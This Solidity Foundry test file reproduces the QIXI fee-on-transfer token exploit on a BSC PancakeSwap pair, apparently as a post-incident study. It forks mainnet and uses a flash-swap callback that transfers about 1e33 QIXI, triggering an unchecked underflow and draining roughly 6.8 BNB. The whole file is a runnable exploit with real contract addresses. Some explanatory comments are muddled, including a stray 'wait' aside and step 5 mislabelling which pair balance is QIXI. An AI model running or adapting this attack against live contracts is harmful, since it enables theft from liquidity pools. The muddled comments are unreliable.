pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~6.8 BNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0x16be4fe1c8fcab578fcb999cbc40885ba0d4ba9f3782a67bd215fb56dc579062
// Attacker : https://bscscan.com/address/0x2723e1f6a9a3cd003fd395cc46882e4573cb249f
// Attack Contract : https://bscscan.com/address/0xb7b0fe129fefa222efd4eb1f6bef9de339339bbb
// GUY : https://x.com/8olidity/status/1555366421693345792

// VULNERABILITY: Integer Underflow in Fee Skim + Flash-Swap Repayment with Inflated Balance (QIXI Tax Token)
// 
// Root Cause:
// The QIXI token (sources/Token_65F11B/Token.sol) is a fee-on-transfer token implemented in Solidity 0.4.25.
// In _transfer (Token.sol:102-143), when neither party is excluded:
//   uint256 freeToken = value/10000;
//   for(int i=0; i<=9; i++) {
//       ...
//       _basicTransfer(from, ad, freeToken/10);   // <-- calls BEFORE debiting main value
//   }
//   value -= freeToken;
//
// _basicTransfer (Token.sol:145-150) uses RAW UNCHECKED arithmetic (0.4.25 default, no SafeMath):
//   balanceOf[sender] -= value;   // underflows if balanceOf[sender] == 0
//   balanceOf[recipient] += value;
//
// An attacker (balance=0) calling transfer() triggers 10 underflows on the sender during skim,
// instantly setting balanceOf[attacker] to ~2^256 - small. The subsequent main debit uses SafeMath.sub
// on the now-huge value (no revert), and Pair receives ~value after fees.
//
// Why Pair Accepts It (PancakePair.sol:452-479):
// - swap() optimistically _safeTransfer's WBNB out to attacker (line 464)
// - THEN calls pancakeCall (line 465) where attacker does QIXI.transfer(Pair, huge)
// - THEN computes amountIn from post-callback balance delta (lines 469-470)
// - THEN only checks constant-product K with 0.25% fee adjustment (lines 474-476):
//     require( balance0Adjusted * balance1Adjusted >= reserve0*reserve1 * 1e8 , 'Pancake: K');
//   The huge QIXI balance delta satisfies this trivially. No check that input tokens have
//   economic value, no reentrancy guard on token side, no min-received on repay.
//
// Impact:
// - Flash-swap drains entire WBNB reserve (~6.8 BNB) in one tx.
// - Repaid with conjured QIXI that has no backing (pair's "QIXI reserve" becomes bogus).
// - Attacker keeps the real WBNB; pair is left with worthless inflated QIXI.
// - Works from ZERO starting QIXI balance (unlike historical attacker that used mmm() mint).
//
// The core flaw is the combination of:
// 1. Sender underflowable fee logic in tax token (unchecked -= on potentially zero balance).
// 2. AMM that trusts post-callback token balances for K invariant without validating token provenance/value.

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 qixi = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215697);

    function setUp() external {
        cheats.createSelectFork("http://127.0.0.1:8546", 20_120_884);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        // VULNERABILITY continued: the swap call initiates the attack.
        Pair.swap(0, WBNB.balanceOf(address(Pair)) - 1e7, address(this), bytes("0x123"));
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
    }

    // EXPLOIT STEPS:
    // 1. Attacker (this contract, balanceOf[QIXI]=0) calls Pair.swap(0, pairWbnb-1e7, this, "0x123")
    //    - This is a flash-swap requesting almost all WBNB (amount1Out).
    // 2. Inside PancakePair.swap (PancakePair.sol:452):
    //    - Checks: amount1Out < reserve1, to != tokens.
    //    - _safeTransfer(WBNB, attacker, amount1Out)  --> WBNB sent to attacker (optimistic)
    //    - data.length>0 => IPancakeCallee(attacker).pancakeCall(...)  (line 465)
    // 3. In pancakeCall:
    //    - attacker calls qixi.transfer(Pair, 999_999_999_999_999e18)  [~1e33 QIXI]
    // 4. Inside QIXI._transfer (from=attacker, to=Pair, value=huge):
    //    - not excluded => enter skim: freeToken = value/10000
    //    - for(i=0; i<=9; i++) _basicTransfer(attacker, randomAd, freeToken/10)
    //      --> EACH does: balanceOf[attacker] -= small   (0 - small  ==> underflow to 2^256-small)
    //      --> after 10 loops, balanceOf[attacker] is huge
    //    - value -= freeToken
    //    - few=2%, burn=... (but since from not excluded here? wait the tax calc after)
    //    - balanceOf[attacker] = huge.sub(value)  [still huge]
    //    - balanceOf[Pair] += (value - few - burn)   --> Pair's QIXI balance now inflated by ~0.98*huge
    // 5. Back in pancakeCall return, swap continues:
    //    - balance1 = pair's new QIXI balance (huge)
    //    - amount1In = balance1 - (reserve1 - 0)  ~ huge
    //    - K check: (balance0Adj * balance1Adj) >= reserve0*reserve1 * 1e8   --> passes because balance1Adj enormous
    //    - _update reserves to the (drained WBNB, inflated QIXI)
    // 6. Attacker keeps the WBNB withdrawn in step 2; transaction succeeds.
    //    Pair now holds junk QIXI instead of WBNB.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        qixi.transfer(address(Pair), 999_999_999_999_999e18);
    }
}
